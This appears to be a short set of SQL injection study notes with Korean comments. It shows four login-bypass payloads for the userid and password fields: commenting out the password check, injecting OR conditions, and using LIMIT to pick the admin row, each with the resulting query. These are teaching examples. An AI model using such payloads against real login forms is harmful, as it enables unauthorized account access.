/*
ID: admin, PW: DUMMY
userid 검색 조건만을 처리하도록, 뒤의 내용은 주석처리하는 방식
*/
SELECT * FROM users WHERE userid="admin"-- " AND userpassword="DUMMY"
/*
ID: admin" or "1 , PW: DUMMY
userid 검색 조건 뒤에 OR (또는) 조건을 추가하여 뒷 내용이 무엇이든, admin 이 반환되도록 하는 방식
*/
SELECT * FROM users WHERE userid="admin" or "1" AND userpassword="DUMMY"
/*
ID: admin, PW: DUMMY" or userid="admin
userid 검색 조건에 admin을 입력하고, userpassword 조건에 임의 값을 입력한 뒤 or 조건을 추가하여 userid가 admin인 것을 반환하도록 하는 방식
*/
SELECT * FROM users WHERE userid="admin" AND userpassword="DUMMY" or userid="admin"
/*
ID: " or 1 LIMIT 1,1-- , PW: DUMMY
userid 검색 조건 뒤에 or 1을 추가하여, 테이블의 모든 내용을 반환토록 하고 LIMIT 절을 이용해 두 번째 Row인 admin을 반환토록 하는 방식
*/
SELECT * FROM users WHERE userid="" or 1 LIMIT 1,1-- " AND userpassword="DUMMY"